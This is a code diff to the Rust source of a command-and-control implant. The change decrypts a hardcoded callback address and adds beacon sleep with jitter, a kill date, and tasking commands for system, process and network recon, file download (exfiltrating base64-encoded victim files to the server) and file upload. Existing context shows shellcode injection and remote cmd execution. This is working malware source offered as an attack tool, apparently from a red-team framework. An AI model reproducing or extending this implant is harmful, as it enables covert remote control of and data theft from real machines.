@@ -1,47 +1,11 @@
-use reqwest::blocking::Client;
-use serde::{Deserialize, Serialize};
+use link_common::{
+    build_client, decrypt_config, derive_key, CallbackRequest, RegisterRequest, TaskResponse,
+};
 use std::env;
 use std::net::UdpSocket;
 use std::process::Command;
 
 const CALLBACK: &str = env!("CALLBACK");
-const UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
-
-// ── Wire types ───────────────────────────────────────────────────────────────
-
-#[derive(Serialize)]
-struct RegisterRequest {
-    link_username: String,
-    link_hostname: String,
-    internal_ip: String,
-    external_ip: String,
-    platform: String,
-    pid: u32,
-}
-
-#[derive(Serialize)]
-struct CallbackRequest<'a> {
-    q: &'a str,
-    tasking: &'a str,
-}
-
-#[derive(Deserialize)]
-struct TaskResponse {
-    q: String,
-    tasking: String,
-    x_request_id: String,
-}
-
-// ── HTTP client ──────────────────────────────────────────────────────────────
-
-fn build_client() -> Client {
-    Client::builder()
-        .danger_accept_invalid_certs(true)
-        .cookie_store(true)
-        .user_agent(UA)
-        .build()
-        .expect("reqwest client init failed")
-}
 
 // ── System info ──────────────────────────────────────────────────────────────
 
@@ -66,18 +30,78 @@ fn local_ip() -> String {
         .unwrap_or_else(|| "unknown".into())
 }
 
+// ── Sleep configuration ───────────────────────────────────────────────────────
+
+static mut SLEEP_SECONDS: u64 = 5;
+static mut JITTER_PERCENT: u32 = 0;
+
+fn get_sleep_seconds() -> u64 {
+    unsafe { SLEEP_SECONDS }
+}
+
+fn get_jitter_percent() -> u32 {
+    unsafe { JITTER_PERCENT }
+}
+
+fn set_sleep_seconds(seconds: u64) {
+    unsafe {
+        SLEEP_SECONDS = seconds;
+    }
+}
+
+fn set_jitter_percent(percent: u32) {
+    unsafe {
+        JITTER_PERCENT = percent.min(100);
+    }
+}
+
+// ── Kill date configuration ────────────────────────────────────────────────
+
+static mut KILL_DATE: Option<i64> = None; // Timestamp in seconds since UNIX_EPOCH
+
+fn get_kill_date() -> Option<i64> {
+    unsafe { KILL_DATE }
+}
+
+fn set_kill_date(timestamp: Option<i64>) {
+    unsafe {
+        KILL_DATE = timestamp;
+    }
+}
+
+fn should_exit() -> bool {
+    if let Some(kill_date) = get_kill_date() {
+        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
+            if now.as_secs() as i64 > kill_date {
+                return true;
+            }
+        }
+    }
+    false
+}
+
 // ── Main C2 loop ─────────────────────────────────────────────────────────────
 
 pub fn link_loop() {
+    // Decrypt the callback address
+    let encryption_key = derive_key("linky-secret-key", "callback-salt");
+    let decrypted_callback =
+        decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());
+
     let client = build_client();
-    let base = format!("https://{}", CALLBACK);
+    let base = format!("https://{}", decrypted_callback);
 
     // Stage 1: establish session cookie
     loop {
         if client.get(format!("{}/js", base)).send().is_ok() {
             break;
         }
-        sleep(5);
+        // Check if we should exit due to kill date
+        if should_exit() {
+            return;
+        }
+
+        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
 
     // Stage 2: register
@@ -138,7 +162,7 @@ pub fn link_loop() {
             }
         }
 
-        sleep(5);
+        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
 }
 
@@ -161,9 +185,17 @@ fn dispatch(raw: &str) -> String {
 
         "whoami" => format!("{}\\{}", hostname(), username()),
 
+        "info" => collect_system_info(),
+        "ps" => list_processes(),
+        "netstat" => list_network_connections(),
+        "sleep" => handle_sleep_command(args),
+        "killdate" => handle_killdate_command(args),
+
         "integrity" => integrity_level(),
 
         "inject" => inject_cmd(args),
+        "download" => download_file(args),
+        "upload" => upload_file(args),
 
         // cmd /C … wrapper sent by the server
         _ if raw.starts_with("cmd /C ") || raw.starts_with("cmd.exe /C ") => {
@@ -376,6 +408,159 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
     )
 }
 
+fn download_file(path: &str) -> String {
+    use std::fs;
+    use std::io::Read;
+
+    if path.is_empty() {
+        return "[-] Usage: download <file_path>".to_string();
+    }
+
+    match fs::File::open(path) {
+        Ok(mut file) => {
+            let mut buffer = Vec::new();
+            if let Err(e) = file.read_to_end(&mut buffer) {
+                return format!("[-] Failed to read file: {}", e);
+            }
+
+            // Encode file content in base64
+            use base64::{engine::general_purpose::STANDARD, Engine};
+            let encoded = STANDARD.encode(&buffer);
+            format!("FILE:{}:{}", path, encoded)
+        }
+        Err(e) => format!("[-] Failed to open file: {}", e),
+    }
+}
+
+fn upload_file(args: &str) -> String {
+    use std::fs;
+    use std::io::Write;
+
+    if args.is_empty() {
+        return "[-] Usage: upload <base64_content> <destination_path>".to_string();
+    }
+
+    // Parse the arguments (content and path are separated by space)
+    let parts: Vec<&str> = args.splitn(2, ' ').collect();
+    if parts.len() < 2 {
+        return "[-] Invalid upload command format".to_string();
+    }
+
+    let content = parts[0];
+    let path = parts[1];
+
+    // Decode base64 content
+    use base64::{engine::general_purpose::STANDARD, Engine};
+    let decoded = match STANDARD.decode(content) {
+        Ok(data) => data,
+        Err(e) => return format!("[-] Failed to decode base64: {}", e),
+    };
+
+    // Write file
+    match fs::File::create(path) {
+        Ok(mut file) => {
+            if let Err(e) = file.write_all(&decoded) {
+                format!("[-] Failed to write file: {}", e)
+            } else {
+                format!("[+] File uploaded successfully: {}", path)
+            }
+        }
+        Err(e) => format!("[-] Failed to create file: {}", e),
+    }
+}
+
+fn collect_system_info() -> String {
+    use std::time::SystemTime;
+
+    let mut info = Vec::new();
+
+    // OS version
+    info.push(format!("OS Version: {}", env::consts::OS));
+
+    // Architecture
+    info.push(format!("Architecture: {}", env::consts::ARCH));
+
+    // Current user and hostname
+    info.push(format!("User: {}\\{}", hostname(), username()));
+
+    // Network interfaces - simplified for Windows
+    info.push("Network: Multiple interfaces (use ipconfig for details)".to_string());
+
+    // Memory info - simplified
+    info.push("RAM: Use Task Manager for detailed memory info".to_string());
+
+    // CPU info
+    info.push(format!("CPU Cores: {}", num_cpus::get()));
+
+    // Uptime - simplified
+    if let Ok(uptime) = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
+        let hours = uptime.as_secs() / 3600;
+        let minutes = (uptime.as_secs() % 3600) / 60;
+        info.push(format!("Uptime: {}h {}m", hours, minutes));
+    }
+
+    // Current process info
+    info.push(format!("Process ID: {}", std::process::id()));
+
+    // Current working directory
+    if let Ok(cwd) = std::env::current_dir() {
+        info.push(format!("Working Directory: {}", cwd.display()));
+    }
+
+    // Environment variables count
+    info.push(format!(
+        "Environment Variables: {}",
+        std::env::vars().count()
+    ));
+
+    info.join("\n")
+}
+
+fn list_processes() -> String {
+    use std::process::Command;
+
+    // On Windows, we'll use tasklist command for simplicity
+    // In a real implementation, you would use Windows API
+    let output = match Command::new("tasklist")
+        .arg("/FO")
+        .arg("CSV")
+        .arg("/NH")
+        .output()
+    {
+        Ok(output) => output,
+        Err(e) => return format!("[-] Failed to execute tasklist: {}", e),
+    };
+
+    if !output.status.success() {
+        return "[-] tasklist command failed".to_string();
+    }
+
+    let output_str = String::from_utf8_lossy(&output.stdout);
+    format!(
+        "PID\tPPID\tUSER\t\tCOMMAND\n{}",
+        output_str.replace(",", "\t")
+    )
+}
+
+fn list_network_connections() -> String {
+    use std::process::Command;
+
+    // On Windows, we'll use netstat command for simplicity
+    // In a real implementation, you would use Windows API
+    let output = match Command::new("netstat").arg("-ano").output() {
+        Ok(output) => output,
+        Err(e) => return format!("[-] Failed to execute netstat: {}", e),
+    };
+
+    if !output.status.success() {
+        return "[-] netstat command failed".to_string();
+    }
+
+    String::from_utf8_lossy(&output.stdout).into_owned()
+}
+
+// ── Encrypted configuration ────────────────────────────────────────────────
+
 // ── Helpers ──────────────────────────────────────────────────────────────────
 
 fn split_first(s: &str) -> (&str, &str) {
@@ -386,4 +571,117 @@ fn split_first(s: &str) -> (&str, &str) {
 
 fn sleep(secs: u64) {
     std::thread::sleep(std::time::Duration::from_secs(secs));
+}
+
+fn sleep_with_jitter(base_seconds: u64, jitter_percent: u32) {
+    use rand::Rng;
+
+    if jitter_percent == 0 {
+        // No jitter, just sleep the base time
+        sleep(base_seconds);
+    } else {
+        // Calculate jitter range (±jitter_percent%)
+        let jitter_range = (base_seconds as f64 * jitter_percent as f64 / 100.0) as i64;
+        let mut rng = rand::thread_rng();
+        let jitter = rng.gen_range(-jitter_range..=jitter_range);
+
+        // Ensure we don't sleep for negative time
+        let sleep_time = if jitter.is_negative() {
+            base_seconds.saturating_sub(jitter.unsigned_abs())
+        } else {
+            base_seconds.saturating_add(jitter as u64)
+        };
+
+        // Sleep for at least 1 second
+        let final_sleep = sleep_time.max(1);
+        sleep(final_sleep);
+    }
+}
+
+fn handle_sleep_command(args: &str) -> String {
+    if args.is_empty() {
+        return format!(
+            "Current sleep: {} seconds, jitter: {}%",
+            get_sleep_seconds(),
+            get_jitter_percent()
+        );
+    }
+
+    // Parse arguments
+    let parts: Vec<&str> = args.split_whitespace().collect();
+
+    if parts.len() >= 1 {
+        if let Ok(new_sleep) = parts[0].parse::<u64>() {
+            set_sleep_seconds(new_sleep);
+
+            if parts.len() >= 2 {
+                if let Ok(new_jitter) = parts[1].parse::<u32>() {
+                    set_jitter_percent(new_jitter);
+                    return format!(
+                        "[+] Sleep updated: {} seconds, jitter: {}%",
+                        get_sleep_seconds(),
+                        get_jitter_percent()
+                    );
+                }
+            }
+
+            return format!("[+] Sleep updated: {} seconds", get_sleep_seconds());
+        }
+    }
+
+    "[-] Usage: sleep <seconds> [jitter_percent]".to_string()
+}
+
+fn handle_killdate_command(args: &str) -> String {
+    if args.is_empty() {
+        match get_kill_date() {
+            Some(timestamp) => {
+                // Convert timestamp to readable date
+                if let Some(date_time) = chrono::NaiveDateTime::from_timestamp_opt(timestamp, 0) {
+                    format!(
+                        "Current kill date: {}",
+                        date_time.format("%Y-%m-%d %H:%M:%S")
+                    )
+                } else {
+                    format!("Current kill date: {} (invalid timestamp)", timestamp)
+                }
+            }
+            None => "No kill date set".to_string(),
+        }
+    } else if args.to_lowercase() == "clear" {
+        set_kill_date(None);
+        "[+] Kill date cleared".to_string()
+    } else {
+        // Parse date in format YYYY-MM-DD or timestamp
+        if let Ok(timestamp) = args.parse::<i64>() {
+            set_kill_date(Some(timestamp));
+            if let Some(date_time) = chrono::NaiveDateTime::from_timestamp_opt(timestamp, 0) {
+                format!(
+                    "[+] Kill date set to: {}",
+                    date_time.format("%Y-%m-%d %H:%M:%S")
+                )
+            } else {
+                format!("[+] Kill date set to timestamp: {}", timestamp)
+            }
+        } else {
+            // Try to parse as date string
+            let formats = [
+                "%Y-%m-%d",
+                "%Y-%m-%d %H:%M:%S",
+                "%Y/%m/%d",
+                "%Y/%m/%d %H:%M:%S",
+            ];
+            for format in formats {
+                if let Ok(parsed_date) = chrono::NaiveDateTime::parse_from_str(args, format) {
+                    let timestamp = parsed_date.and_utc().timestamp();
+                    set_kill_date(Some(timestamp));
+                    return format!(
+                        "[+] Kill date set to: {}",
+                        parsed_date.format("%Y-%m-%d %H:%M:%S")
+                    );
+                }
+            }
+            "[-] Usage: killdate [timestamp|YYYY-MM-DD|clear]".to_string()
+        }
+    }
 }
